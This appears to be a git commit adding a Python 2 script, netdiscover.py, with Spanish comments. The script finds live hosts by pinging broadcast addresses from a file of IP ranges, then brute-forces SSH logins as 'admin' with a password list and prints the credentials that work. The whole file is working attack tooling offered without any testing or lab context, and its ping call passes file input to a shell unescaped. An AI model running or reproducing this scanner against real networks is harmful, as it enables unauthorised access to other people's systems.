0dc5c781d4544a79b54b688c061bcb2632a25761
bea103 <beatricia103@gmail.com>
2018-02-03 10:57:15 +0100

    First_version

---
+++ netdiscover.py
@@ -0,0 +1,64 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import os
+import subprocess
+import ipaddress
+import re
+import collections
+import paramiko
+
+def GetNetwAddress():
+
+    """
+        Open the file to get the IP range supossing format A.B.C.D /8,12,etc
+    """
+    try:
+        addresses = list()
+        with open('iprange.txt','r') as fil:
+            for ip_add in fil:
+                ip_add=re.search(r'[^\r ^\n]*',unicode(ip_add, "utf-8"))
+                ip_add=ipaddress.ip_network(ip_add.group())
+                broadcast_address = ip_add.broadcast_address
+                proc = subprocess.Popen("ping -c 2 -b " + str(broadcast_address),stdout=subprocess.PIPE, shell = True)
+            	(out,err)=proc.communicate()
+                for line in out.splitlines():
+                    matches=re.search(r'^\d+ bytes from (?P<IP>.*): icmp_req=\d ttl=\d+ time=.*$',line, re.MULTILINE)
+                    if matches:
+                        addresses.append(matches.group('IP'))
+
+        iplist = [item for item, count in collections.Counter(addresses).items() if count == 1]
+
+        return iplist
+    except IOError:
+        print "The file with the IP range doesn't exist"
+    except ValueError:
+        print "The range is not valid"
+
+def scandpassword():
+    iplist = GetNetwAddress()
+    passwords = list()
+    with open('password.txt', 'r') as passwo:
+        for line in passwo:
+            passwords.append(line.replace("\r\n",""))
+    passwordss = list()
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for address in iplist:
+        for pas in passwords:
+            try:
+                print "Intentando conexión con " + address+ " password " + pas
+                ssh_client.connect(hostname=address,
+                                   username='admin', #El sabiondo de Spark dice que se tienen que todos los usernames son así
+                                   password=pas)
+                passwordss.append([address, pas])
+                print "exito"
+            except Exception as e:
+                print "fallida"
+                continue
+    for i in passwordss:
+        print i[0]+":"+i[1]
+    return passwordss
+""""
+    Bea, la función scandpassword hace el ping y devuelve una lista de dos dimensiones tal que [host contraseña]
+"""
